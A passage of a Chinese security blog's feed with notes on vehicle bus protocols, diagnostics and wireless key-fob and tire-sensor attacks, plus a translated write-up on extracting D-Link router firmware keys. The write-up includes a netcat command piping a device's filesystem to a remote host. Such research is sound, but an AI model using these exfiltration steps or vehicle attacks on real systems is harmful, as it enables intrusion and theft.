<p>参考：《汽车黑客大曝光》</p>
</blockquote>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
        <tag>CAN总线</tag>
      </tags>
  </entry>
  <entry>
    <title>tenda多款设备认证绕过漏洞</title>
    <url>/2022/01/27/iot/tenda%E5%A4%9A%E6%AC%BE%E8%AE%BE%E5%A4%87%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<ul>
<li>CVE-2021-44971：<ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44971" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44971</a></li>
<li><a href="https://github.com/21Gun5/my_cve/blob/main/tenda/bypass_auth.md" target="_blank" rel="noopener">https://github.com/21Gun5/my_cve/blob/main/tenda/bypass_auth.md</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>认证绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>汽车中的诊断及日志服务</title>
    <url>/2022/01/26/iov/%E6%B1%BD%E8%BD%A6%E4%B8%AD%E7%9A%84%E8%AF%8A%E6%96%AD%E5%8F%8A%E6%97%A5%E5%BF%97%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<h1 id="汽车中的诊断及日志服务"><a href="#汽车中的诊断及日志服务" class="headerlink" title="汽车中的诊断及日志服务"></a>汽车中的诊断及日志服务</h1><ul>
<li>OBD-II连接器可用于汽车检修</li>
<li>汽车发生故障时，故障相关信息会被保存，并且故障指示灯-MIL点亮</li>
<li>汽车诊断功能由车辆主ECU处理，即动力系统控制模块PCM</li>
</ul>
<a id="more"></a>
<h2 id="故障诊断代码-DTC"><a href="#故障诊断代码-DTC" class="headerlink" title="故障诊断代码-DTC"></a>故障诊断代码-DTC</h2><ul>
<li>故障诊断代码即DTC，PCM将故障相关信息保存于此</li>
<li>DTC可存储在不同的位置，如有的存在RAM断电丢失，而重要的DTC可存储在不受电源影响的区域</li>
<li>故障分为软硬两种<ul>
<li>软故障指一些间歇性故障可自行消除，而硬故障需要人工干预才可消除</li>
<li>清除汽车DTC，观察故障是否重现，若仍存在则为硬故障</li>
</ul>
</li>
<li>并非所有故障都会点亮MIL</li>
<li>PCM在存储DTC时，会对发动机相关信息进行快照，将快照和DTC一起存放在冻结帧数据中。</li>
<li>DTC格式<ul>
<li>长度5个字符，两个字节即可表示</li>
<li>第一个字符为字母，表示汽车部件，如P表示动力系统，B表示车身</li>
<li>可在网上查询到某DTC的含义</li>
<li>DTC与十六进制数据转换的问题，除了前两个字符，后3字符与十六机制一一对应</li>
</ul>
</li>
<li>DTC扫描工具：可读取、清除DTC，非必需</li>
<li>DTC的清除<ul>
<li>PCM多次检查后不再发现故障，DTC清除，同时MIL熄灭</li>
<li>软故障DTC可用扫描工具、断电来清除</li>
<li>硬故障DTC和永久性DTC存储在NVRAM中，PCM检测不到故障时才清除</li>
</ul>
</li>
</ul>
<h2 id="统一诊断服务-UDS"><a href="#统一诊断服务-UDS" class="headerlink" title="统一诊断服务-UDS"></a>统一诊断服务-UDS</h2><ul>
<li>简介<ul>
<li>UDS，提供一种统一的展示汽车状态的方式，但效果不好，因为CAN数据包的内容不是统一的，因厂家等多因素而异</li>
<li>汽车制造商将数据包的内容信息作为商品，UDS的作用是提供一种令该信息（部分而非全部）可用的途径</li>
<li>UDS可提供诊断测试或固件修改等高级操作，原理是：通过UDS系统，诊断工具可发送一个执行某动作的请求，该请求产生信号（如CAN数据包），部件收到信号后执行动作</li>
</ul>
</li>
<li>由于CAN数据帧长度大小限制为8，为发送更多数据，故UDS使用IOS-TP</li>
<li>通过常规CAN发送IOS-TP的数据包，正响应：<ul>
<li>请求：7df#02010d<ul>
<li>7df：CAN ID，7df表示OBD诊断代码</li>
<li>02：数据包大小，即010d</li>
<li>01：诊断数据的模式（或称服务/SID），01表显示数据</li>
<li>0d：子服务号（或称PID），0d表车速</li>
</ul>
</li>
<li>响应：7e8#03410d00<ul>
<li>7e8：请求CAN ID +8</li>
<li>03：数据包大小，即410d00</li>
<li>41：正响应在原有模式上+40，01+40=41，若负响应则直接0x7f</li>
<li>0d：同请求，为请求显示车速的服务号</li>
<li>00：具体服务对应的数据，即车速为0</li>
</ul>
</li>
</ul>
</li>
<li>通过常规CAN发送IOS-TP的数据包，负响应：<ul>
<li>请求：7df#021101（服务11表重置ECU）</li>
<li>响应：7e8#037F1111<ul>
<li>7f：负响应则0x7f，而非+40</li>
<li>前11：同请求，为重置ECU的服务号</li>
<li>后11：错误原因，11表不支持的服务（具体错误代码可网上查询）</li>
</ul>
</li>
</ul>
</li>
<li>通过IOS-TP发送数据包<ul>
<li>可见《IOS-TP发送数据》一文</li>
<li>个人理解，UDS的数据包格式为IOS-TP，但是发送方式有两种：常规CAN和IOS-TP（后者可发送大于8字节的数据）</li>
</ul>
</li>
<li>诊断的模式及PID<ul>
<li>需注意：模式也称服务/SID，而PID也称子服务，叫法不同罢了，暂不必纠结，理解就好</li>
<li>诊断代码中数据的第一个字节表模式，手册中一般<code>$ + 十六机制数</code>表示，随后的1字节即PID</li>
<li>遇到过的几种模式：0x01显示当前数据、0x09请求车辆信息（查询VIN码）</li>
</ul>
</li>
<li>每个厂商都有自己专有的模式及PID，如何获取？<ul>
<li>程序逆向法：即逆向经销商提供的相关软件</li>
<li>暴力破解法：利用工具对车辆进行爆破，如CaringCaribou</li>
</ul>
</li>
<li>为避免那些耗时长的操作被中断，需要使车辆保持诊断状态，可采取心跳机制，即通过脚本定时向车辆发送数据包</li>
</ul>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li><p>EDR-事件数据记录器</p>
<ul>
<li>类似飞机的黑匣子</li>
<li>多种信息可保存在EDR中，类似冻结帧，但二者保存的时机不同，前者事故，后者故障</li>
<li>事故信息原本存储于安全气囊控制模块-ACM中，如今已分布存储在汽车多个ECU中，EDR可从ECU和传感器中收集数据，存储起来供车祸时恢复</li>
<li>可使用CDR工具包从EDR中读取数据，两种方式：连接到OBD接口从主ECU中提取、不使用OBD直接连接具体设备</li>
<li>SAE J1698标准中列举了一些用于事件数据收集的推荐方法，但并非所有的厂商都遵循此标准</li>
</ul>
</li>
<li><p>ACN-自动事故呼救系统（意如其名），ACN是各制造商专有的，不同的ACN发送的信息也不同</p>
</li>
<li>安全研究者的角度<ul>
<li>可将车辆的DTC或冻结数据帧作为目标来隐藏恶意行为（不太理解，等实例）</li>
<li>检查发送的DTC，使用DTC中包含的信息来决定哪个部件受影响（同上）</li>
<li>可通过UDS更新固件，可执行恶意程序</li>
<li>可暴力破解厂商的诊断模式及PID</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：《汽车黑客大曝光》</p>
</blockquote>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
      </tags>
  </entry>
  <entry>
    <title>汽车中的总线协议</title>
    <url>/2022/01/24/iov/%E6%B1%BD%E8%BD%A6%E4%B8%AD%E7%9A%84%E6%80%BB%E7%BA%BF%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="汽车中的总线协议"><a href="#汽车中的总线协议" class="headerlink" title="汽车中的总线协议"></a>汽车中的总线协议</h1><h2 id="CAN总线协议"><a href="#CAN总线协议" class="headerlink" title="CAN总线协议"></a>CAN总线协议</h2><ul>
<li>简介<ul>
<li>汽车中的嵌入式系统和ECU可通过CAN协议通信</li>
<li>CAN运行在高电平和低电平两条线路上，使用差分信号（可对噪声容错）</li>
<li>某汽车CAN总线上传输的数据包，可能并非标准的</li>
</ul>
</li>
<li>寻找CAN连接器<ul>
<li>CAN总线静电平为2.5V，有信号输入时会有1V的波动，故可用万用表检测电压来确定</li>
<li>CANH和CANL分别连在OBD-II的引脚6和14</li>
</ul>
</li>
<li>CAN数据包<a id="more"></a><ul>
<li>分2种，标准和扩展，后者可兼容前者</li>
<li>4种主要元素：CAN ID、标示符扩展、DLC、data</li>
<li>通过广播发送，同一网络中所有设备都可接收到</li>
<li>缺陷：由于CAN数据包广播的特点，任何设备都可接收到数据，因此可以网络嗅探和设备伪造</li>
</ul>
</li>
<li>IOS-TP协议<ul>
<li>CAN的扩展协议，又称IOS 15765-5，可突破CAN中8字节的数据大小限制</li>
<li>常用于诊断、KWP消息、传输大量CAN数据</li>
<li>封装到CAN中，其Data字段首字节用于扩展寻址，故只剩7字节数据</li>
<li>容易引起总线泛洪，故总线繁忙时需谨慎</li>
</ul>
</li>
<li>CAN的扩展协议<ul>
<li>IOS-TP：如上</li>
<li>CANopen：在工业环境中较汽车更常见，广播消息的功能码和节点ID均为0x0</li>
<li>GMLAN：通用汽车的CAN总线实现</li>
</ul>
</li>
</ul>
<h2 id="其它总线协议"><a href="#其它总线协议" class="headerlink" title="其它总线协议"></a>其它总线协议</h2><ul>
<li><p>SAE J1850协议</p>
<ul>
<li><p>旧车型在使用，与CAN相比，又旧又慢但成本低</p>
</li>
<li><p>有两种：PWM（OBD-II上引脚2和10）、VPM（仅引脚2）</p>
</li>
<li><p>按速率可分为ABC三类，速率和成本依次增加</p>
</li>
</ul>
</li>
<li><p>KMP 2000协议</p>
<ul>
<li>即关键字协议2000，ISO 14230</li>
<li>使用引脚7、可最多包含255字节</li>
<li>依据波特率初始化的不同而产生变种</li>
<li>K-line：欧洲汽车中KWP2000的变种，使用引脚7或15，类似UART协议</li>
</ul>
</li>
<li>LIN协议<ul>
<li>局域互联网协议，成本低，为了补充CAN而设计</li>
<li>LIN不会被接入OBD连接器</li>
<li>LIN帧包括起始和响应两部分</li>
</ul>
</li>
<li>MOST协议<ul>
<li>为多媒体设备而设计的，实现成本较高</li>
<li>相关攻击点：汽车的音频/视频流、可访问汽车的蜂窝移动通信系统</li>
<li>可通过车辆娱乐信息单元、车载MOST控制器进行破解</li>
<li>most4linux提供一个用于MOST PCI设备的内核驱动</li>
</ul>
</li>
<li>FlexRay总线<ul>
<li>高速总线，用于时间敏感的通信</li>
<li>实现成本高，故用于高端系统，而CAN适中，LIN用于低成本设备</li>
<li>尚无嗅探其网络的标准开源工具</li>
</ul>
</li>
<li>汽车以太网<ul>
<li>由于MOST和FlexRay昂贵且支持性不高，故新型汽车转向使用汽车以太网</li>
<li>对研究者而言，问题在于如何与以太网进行通信（通信线缆不易获取）</li>
</ul>
</li>
</ul>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li><p>总线协议</p>
<ul>
<li>汽车中可能包含一种或多种总线协议，若年代久远，则可能没有</li>
<li>总线协议管理车辆网络上数据包的传输</li>
<li>汽车厂商可自行选择总线、协议</li>
<li>总线可按照速度分类，关键通信用高速总线，非关键则用中低速</li>
<li>要确定某汽车的采用哪种总线，需查询该汽车的OBD-II所使用的引脚</li>
</ul>
</li>
<li><p>OBD-II连接器</p>
<ul>
<li><p>又称DLC，可用于与汽车内部网络的通信</p>
</li>
<li><p>CAN总线协议，存在于所有汽车的ODB-II连接器上（但并非所有的总线线路都通过OBD-II连接器来引出）</p>
</li>
<li><p>除了各种总线规定要连接的引脚，其余引脚由厂家自行决定</p>
</li>
<li><p>不只连接一条CAN线缆，还有低速或中速CAN</p>
</li>
<li><p>英式和美式两种类型的连接器，其电源都使用引脚9</p>
</li>
</ul>
</li>
<li><p>OBD标准</p>
<ul>
<li>OBD二代标准，设计目标是满足排放测试</li>
<li>OBD三代标准，可允许PCM-动力控制模块在无需与车主交互的情况下，远程发送相关状态</li>
<li>大多数情况下，OBD三代是“床下抓孩子的妖怪”，即过度渲染但名不副实</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：《汽车黑客大曝光》</p>
</blockquote>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
        <tag>CAN总线</tag>
      </tags>
  </entry>
  <entry>
    <title>IOS-TP发送数据</title>
    <url>/2022/01/18/iov/IOS-TP%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="IOS-TP发送数据"><a href="#IOS-TP发送数据" class="headerlink" title="IOS-TP发送数据"></a>IOS-TP发送数据</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>IOS-TP又称IOS 15765，最常见的用途即诊断</li>
<li>CAN协议标准规定了数据最大长度为8字节，IOS-TP可突破8字节大小的限制</li>
<li>当待发送的数据量大于8字节时，需发送多个CAN数据帧，IOS-TP可用来协调多个帧的发送</li>
<li>IOS-TP协议规定了4种帧类型，通过第一个半字节来区分<ul>
<li>单帧：0x0，一个帧即包含了所有数据，随后的一个半字节表示数据长度</li>
<li>首帧：0x1，用于传输多个帧，随后的三个半字节表示数据长度</li>
<li>连续帧：0x2，首帧后的连续数据，随后一个半字节表帧序号</li>
<li>流控帧：0x3，对首帧的响应，表示后续还有数据<a id="more"></a></li>
</ul>
</li>
</ul>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><blockquote>
<p>查询VIN码</p>
</blockquote>
<ul>
<li>假如VIN码为：12345678901234567</li>
<li>发送请求：<code>7df 02 09 02</code><ul>
<li>07df：canid，表示向所有ECU发送</li>
<li>02：数据长度</li>
<li>09：服务，即查询车辆信息</li>
<li>02：可理解为子服务，即查询车辆信息中的VIN码</li>
</ul>
</li>
<li>首帧响应：<code>7e8 10 14 49 02 01 31 32 33</code><ul>
<li>7e8：响应can id，请求can id + 8</li>
<li>10：第一个半字节为1，表示为首帧</li>
<li>14：数据长度，即20</li>
<li>49：响应SID，请求SID即09+40（响应出错则7f）</li>
<li>02：子服务号，同请求</li>
<li>01：表示只有一个VIN码</li>
<li>31 32 33：VIN码的部分数据</li>
</ul>
</li>
<li>流控帧，表示还有后续数据：<code>30</code><ul>
<li>30：第一个半字节为4，即流控</li>
</ul>
</li>
<li>2个连续帧，<code>21 34 35 36 37 38 39</code>和<code>22 34 35 36 37 38 39</code><ul>
<li>21：第一个半字节为2，表示连续帧</li>
<li>21、22：后半字节的1和2，表示帧序号</li>
<li>34，35等：VIN码的部分数据</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
      </tags>
  </entry>
  <entry>
    <title>如何提取D-Link解密密钥</title>
    <url>/2022/01/07/iot/%E5%A6%82%E4%BD%95%E6%8F%90%E5%8F%96D-Link%E8%A7%A3%E5%AF%86%E5%AF%86%E9%92%A5/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="如何提取D-Link解密密钥"><a href="#如何提取D-Link解密密钥" class="headerlink" title="如何提取D-Link解密密钥"></a>如何提取D-Link解密密钥</h1><p>当我们在分析固件镜像时，遇到的最常见障碍之一便是加密。虽然已经有一些方法可用于解密固件镜像，但今天我们仍将简要介绍一下，如何提取D-Link部分路由器型号中的加密密钥，特别是<a href="https://www.dlink.com/en/products/dir-x1560-exo-ax-ax1500-wi-fi-6-router" target="_blank" rel="noopener">D-Link DIR-X1560。</a>该设备与 <a href="https://www.dlink.com/en/products/dir-x5460-exo-ax-ax5400-wi-fi-6-router" target="_blank" rel="noopener">D-Link DIR-X5460</a>是同一代路由器的一部分，最近，针对该设备，德国流行技术杂志Chip和IoT Inspector联合对其进行了Wi-Fi路由器相关的安全检查。</p>
<h2 id="01-D-Link路由器固件加密"><a href="#01-D-Link路由器固件加密" class="headerlink" title="01-D-Link路由器固件加密"></a>01-D-Link路由器固件加密</h2><p>D-Link倾向于用自定义的固件更新文件格式，来加密他们的固件镜像。许多DIR系列的D-Link路由器，使用带有<code>SHRS</code>头的固件更新文件格式：<a id="more"></a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">00000000  53 48 52 53 01 13 91 5D 01 13 91 60 67 C6 69 73 SHRS‘]‘`gÆis</span><br></pre></td></tr></table></figure>
<p>这种固件格式及加密方案已经被公开记录。一位名叫<a href="https://twitter.com/0xricksanchez" target="_blank" rel="noopener">0xricksanchez</a> 的研究者，发布了一篇非常棒的writeup，记录了如何发现SHRS固件镜像（包含<a href="https://www.iot-inspector.com/blog/advisory-d-link-dir-3060/" target="_blank" rel="noopener">DIR-3060</a>，我们已经发布了一篇相关advisory）中密钥的过程。他们从<code>imgdecrypt</code>二进制文件中提取出了加密密钥和初始向量IV，此二进制文件可以通过类似系列型号中的URAT shell获得。</p>
<p>然后，最近我们遇到了DIR-X系列的路由器，它们的固件头有一点不同。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">00000000  65 6e 63 72 70 74 65 64  5f 69 6d 67 02 0a 00 14  |encrpted_img....|</span><br></pre></td></tr></table></figure>
<p>头部就是一个<code>encrpted_img</code>字符串，然后紧跟其后的是镜像大小字段（32位大端模式）。</p>
<p><code>SHRS</code>固件镜像的key不适用于这些<code>encrpted_img</code> 镜像，因此我们需要找到另一种方法，将解密密钥从这种加密格式的设备中提取出来。</p>
<h2 id="02-密钥在哪里"><a href="#02-密钥在哪里" class="headerlink" title="02-密钥在哪里?"></a>02-密钥在哪里?</h2><p>显然，我们无法从加密的固件镜像中提取加密密钥，因为它是加密的。所以，我们需要找到另一种方法来获取密钥key。</p>
<p>如果我们能够在设备上以某种方式执行代码，那么就很简单了。如有足够的本地权限，我们可以在设备运行时，访问设备上的所有内容。这是解密后的固件镜像。</p>
<p>如果设备制造商最近才引入固件加密，则可以追踪尚未加密的老版本固件镜像（很可能是引入加密之前的固件版本），并检查是否可以从中提取出密钥key。</p>
<p>直接读取设备的flash内存，是我们可以采用的另一种技术。在flash中固件不太可能被加密。拆开其中一个设备，卸掉flash内存芯片，转储内存后再读取文件系统。但是这样破坏性太太了，设备很昂贵，一旦损坏将大大浪费。</p>
<p>在这里，我们不会深入探讨这些问题，因为其他人已经做过了。关于这个问题<a href="https://www.zerodayinitiative.com/blog/2020/2/6/mindshare-dealing-with-encrypted-router-firmware" target="_blank" rel="noopener">Zero Day Initiative</a>有一篇详细的文章，当你在解决固件加密时，可以考虑这个方法。</p>
<h2 id="03-Shell中的操作"><a href="#03-Shell中的操作" class="headerlink" title="03-Shell中的操作"></a>03-Shell中的操作</h2><p>在我们的例子中，通过UART调试接口可以轻松得到DIR-X1560设备的shell。获取到交互式shell后，就可以轻松dump出整个文件系统。使用内置的<code>busybox tar</code>和<code>nc</code>命令可以很容易地做到这一点。首先在设备上设置监听器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nc –nvlp [PORT] &gt; filesystem.tar.gz</span><br></pre></td></tr></table></figure>
<p>然后在设备上运行以下指令，只写明想要传出的根目录即可。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tar -cvz /bin/ /data/ /etc/ /etc_ro/ /lib/ /libexec/ /mnt/ /opt/ /sbin/ /usr/ /var/ /webs/ | nc [IP ADDRESS] [PORT]</span><br></pre></td></tr></table></figure>
<p>最终，将得到tar.gz压缩文件，包含文件系统中任何你想要的部分，然后通过网络传输出来。</p>
<h2 id="04-发现在何处解密"><a href="#04-发现在何处解密" class="headerlink" title="04-发现在何处解密"></a>04-发现在何处解密</h2><p>不同于“SHRS”固件镜像，没有明显的<code>imgdecrypt</code>二进制文件可供关注。因此我们可以跟踪固件上传过程，看是否可以定位到在哪里解密。</p>
<p>幸运的是，固件头部的字符串，可以作为独特的关键字，帮助我们在文件系统中找到相关程序。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ grep -r encrpted_img</span><br><span class="line">Binary file bin/fota matches</span><br><span class="line">Binary file bin/httpd matches</span><br><span class="line">Binary file bin/prog.cgi matches</span><br></pre></td></tr></table></figure>
<p>在此我们找到了两个二进制程序 <code>prog.cgi</code> 和<code>fota</code>，二者可能以某种方式来处理加密过的固件镜像。</p>
<p>在<code>progl.cgi</code>中，根据字符串<code>encrypted_img</code>，我们可以很容易的追踪到固件上传的地方。</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-12-072258.jpg" alt="Clipboard10"></p>
<p>通过跟随固件被加密部分的指针变量，发现函数<code>FUN00033144</code>被调用，此指针是其第一个参数。</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-12-072307.jpg" alt="Clipboard11"></p>
<p>在这个函数内部，出现一个极有可能是固件解密的函数： <code>gj_decode()</code></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-12-072302.jpg" alt="Clipboard12"></p>
<h2 id="05-深入库文件"><a href="#05-深入库文件" class="headerlink" title="05-深入库文件"></a>05-深入库文件</h2><p><code>gj_decode()</code>函数被定义在<code>libcmd_util.so</code>文件中，此函数代码不多，但关键的是，其内部调用了两个加密相关的函数： <code>aes_set_key</code> 和<code>aes_cbc_decrypt</code>。这两个函数也被定义在上述库文件中，但我们没必要深究这二者。因为它们的函数名已经给予了很多信息：像是CBC模式下的AES加密。</p>
<p>我们可以看到，<code>aes_set_key()</code>的第二个参数可能是AES密钥，而 <code>aes_cbc_decrypt</code> 的第二个参数可能是初始向量IV。</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-12-072312.jpg" alt="Clipboard13"></p>
<p>这里的反编译代码有点乱，但不要太在意细节，直接看代码逻辑。有两个do-while循环，将数据从全局变量复制到本地缓冲区，这些循环在全局地址的字节上迭代，直到到达某个特定的结束地址。</p>
<p> <code>key_loc</code> 和<code>key_loc + 4</code>是指向本地缓冲区的指针变量，第一个循环中，<code>00031ba3</code>地址处的数据拷贝到<code>key_loc+4</code>直到<code>00031bc3</code>地址，而第二个循环，<code>00031bc5</code>地址处的数据拷贝到<code>key_loc</code>直到<code>00031bd5</code>地址（还注意到：这两个本地指针分别是aes_cbc_decrypt()和aes_set_key()的第二个参数）</p>
<p>的确如此，在地址<code>00031ba3</code>处，可见有一个字节数组。</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-12-072319.jpg" alt="Clipboard14"></p>
<p>同样在<code>00031bc5</code>地址处，也可见类似的形式。</p>
<p>因此，我们可以假设AES密钥位于 <code>00031ba3</code>，而初始向量IV位于 <code>00031bc5</code>。</p>
<p>今天我们在这不会公布真实的密钥，但是那些关注且跟随者应该有能力将密钥提取出来，如他们而言，这是留给有兴趣读者的练习。</p>
<h2 id="06-节省时间和脑力"><a href="#06-节省时间和脑力" class="headerlink" title="06-节省时间和脑力"></a>06-节省时间和脑力</h2><p>通过使用<a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef</a>，我们可以快速、轻松地验证假设。大多数情况下，当我想要快速解决密码学相关问题时，我都会打开这个工具。它由英国GCHQ编写，如果对公务员写的东西持怀疑态度，大可不必，它只是用纯JavaScript编写，可以在你想要的任何浏览器中运行。</p>
<p>复制加密固件镜像中的第一个0x1000左右字节的数据，作为16进制的ASCII粘贴到CyberChef输入中，再结合我们提取的密钥和IV，通过CyberChef的“AES Decrypt”操作，就可以得到一个理想的结果。</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-12-072316.jpg" alt="Clipboard15"></p>
<p>在这里我们可以看到UBI数据块的头部数据，说明我们正在完全的解密整个固件更新包。</p>
<p>一旦我们知道密钥和IV是有效的，那么很容易就可以编写一个完整的解密脚本。在这种情况下，在我们得到一个完整且正确的镜像之前，还有几个小的问题需要克服，比如数据对齐，但这些都很容易解决。</p>
<h2 id="07-结论"><a href="#07-结论" class="headerlink" title="07-结论"></a>07-结论</h2><p>在许多情况下，嵌入式设备中的固件被加密并不是一个很难解决的问题。一旦可以获取到物理设备，解密过程就可以大大简化。值得记住的是，嵌入式设备的固件加密主要在固件更新包中实现，而很少在存储级别实现，这一点与移动电话和笔记本电脑的最新实现相反，这二者常见的加密方法是全磁盘（至少是磁盘的重要部分）加密。</p>
<p>这种设置在未来可能会改变，至少是部分改变。例如，Android从4.4开始就支持 <a href="https://source.android.com/security/encryption/full-disk" target="_blank" rel="noopener">全磁盘加密</a> ，从7.0开始支持<a href="https://source.android.com/security/encryption/file-based" target="_blank" rel="noopener">基于文件的加密</a>。自Android 10以来，就需要基于文件的加密。然而应该注意的是，术语“完整磁盘”加密在Android中具有误导性，即加密的只是<code>data/userdata</code>分区。</p>
<p>首发于安全客：<a href="https://www.anquanke.com/post/id/262855" target="_blank" rel="noopener">https://www.anquanke.com/post/id/262855</a></p>
<blockquote>
<p>译者注：直接英译中后语句太过拗口，在不改变原意的情况下做了些许调整<br>原文：<a href="https://www.iot-inspector.com/blog/extracting-decryption-keys-dlink/" target="_blank" rel="noopener">How-To: Extracting Decryption Keys for D-Link</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>固件解密</tag>
      </tags>
  </entry>
  <entry>
    <title>汽车中的无线安全</title>
    <url>/2021/12/28/iov/%E6%B1%BD%E8%BD%A6%E4%B8%AD%E7%9A%84%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="汽车中的无线安全"><a href="#汽车中的无线安全" class="headerlink" title="汽车中的无线安全"></a>汽车中的无线安全</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>嵌入式无线系统易于攻击<ul>
<li>依赖较短的通信距离作为安全保障</li>
<li>没有检查数据有效性的措施</li>
</ul>
</li>
<li>需要工具<ul>
<li>可编程电台：可能需要两台，以便同时收发信号</li>
<li>软件无线电即SDR设备：重要指标为采样率、可与GNU Radio配合工作<a id="more"></a></li>
<li>GNU Radio：过滤信号、识别调制方式、帮助从无线信号得到可识别和操作的数据</li>
</ul>
</li>
<li>信号调制<ul>
<li>指无线信号中表示二进制数据的方式，区分二进制0/1</li>
<li>为了应用正确的调制器，需识别信号所采用的调制方式</li>
<li>常用的方式有两种：幅移键控ASK、频移键控FSK</li>
</ul>
</li>
</ul>
<h2 id="TPMS攻击"><a href="#TPMS攻击" class="headerlink" title="TPMS攻击"></a>TPMS攻击</h2><ul>
<li><p>TPMS即胎压检测系统</p>
<ul>
<li>安装在轮胎内，将胎压等信息发送给ECU，再通过仪表等设备展示给司机</li>
<li>由于TREAD法案，其被广泛应用，故成为普适的攻击目标</li>
<li>大多数使用射频方式与ECU通信，通信频率依设备而异（本章重点）</li>
<li>某些采用蓝牙通信，通信距离更远但支持安全通信，故难以拦截和接入</li>
</ul>
</li>
<li><p>信号监听</p>
<ul>
<li>TPMS的低泄漏特征：其信号强度弱，故传播距离近，可增加低噪声放大器来提升嗅探范围</li>
<li>TPMS以间隔时间发送信号，车速未达标时不发送，故对发动机未启动的车辆进行研究时，应发送唤醒信号触发其响应</li>
<li>收到TPMS信号后，需对其解码来获得可理解的内容</li>
</ul>
</li>
<li><p>TPMS数据包</p>
<ul>
<li>结构：包头、ID、压力及温度、标志、校验和</li>
<li>传感器ID，可识别目标指纹，用于跟踪或触发事件</li>
<li>若使用曼彻斯特编码，需在分析前对数据包解码</li>
</ul>
</li>
<li>激活信号<ul>
<li>信号以间隔时间发送，可用SDR向TPMS发送激活信号，手动来触发响应</li>
<li>发送激活信号和响应之间存在延迟，故拦截响应时需注意</li>
<li>TPMS传感器不对输入进行校验，但ECU会检查以确保识别信号ID</li>
</ul>
</li>
<li>TPMS攻击举例<ul>
<li>通过布置接收器，可对车辆进行跟踪</li>
<li>感知到某TPMS传感器ID时，触发特定事件</li>
<li>设置GNU radio为发送模式，向传感器洪泛激活请求，耗尽电池</li>
</ul>
</li>
</ul>
<h2 id="遥控钥匙攻击"><a href="#遥控钥匙攻击" class="headerlink" title="遥控钥匙攻击"></a>遥控钥匙攻击</h2><ul>
<li>简介<ul>
<li>无钥匙进入系统中广泛应用了RFID技术，而早期采用红外技术</li>
<li>使用低频DFID，可保证遥控钥匙电池耗尽时，钥匙系统也可正常工作</li>
<li>使用gqrx，可在遥控钥匙向车辆发送RFID信号时，识别其频率</li>
</ul>
</li>
<li>遥控钥匙攻击<ul>
<li>干扰信号：在RFID接收器通带范围内，向接收机发送垃圾数据，干扰其接收</li>
<li>回放攻击：将请求存储后，可回放信号来开启车门</li>
<li>前向预测攻击：观察多次质询-响应过程，可对下次质询做预测</li>
<li>字典攻击：将多次的交换信息存储于字典中，使用收集的密钥反复请求应答器的质询，直至匹配字典中的响应</li>
<li>硬件攻击：导出应答器存储器的内存数据，从而获得密钥</li>
<li>CAN总线逆向：若可访问CAN总线，即可重放开启或锁定的数据包</li>
<li>应答器复制机：从目标车辆中获取应答器信号，用其制作克隆版钥匙</li>
</ul>
</li>
<li>攻击PKES<ul>
<li>//here，未完待续</li>
</ul>
</li>
</ul>
<h2 id="防盗系统攻击"><a href="#防盗系统攻击" class="headerlink" title="防盗系统攻击"></a>防盗系统攻击</h2><blockquote>
<p>参考：《汽车黑客大曝光》</p>
</blockquote>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
      </tags>
  </entry>
  <entry>
    <title>车间通信安全</title>
    <url>/2021/12/20/iov/%E8%BD%A6%E9%97%B4%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="车间通信安全"><a href="#车间通信安全" class="headerlink" title="车间通信安全"></a>车间通信安全</h1><ul>
<li><p>V2V简介</p>
<ul>
<li><p>向车辆传达安全和交通警示信息，该信息通过网络（由由车辆、路边设备组成）传播</p>
</li>
<li><p>在设计阶段（而非事后）就考虑安全问题的汽车协议</p>
</li>
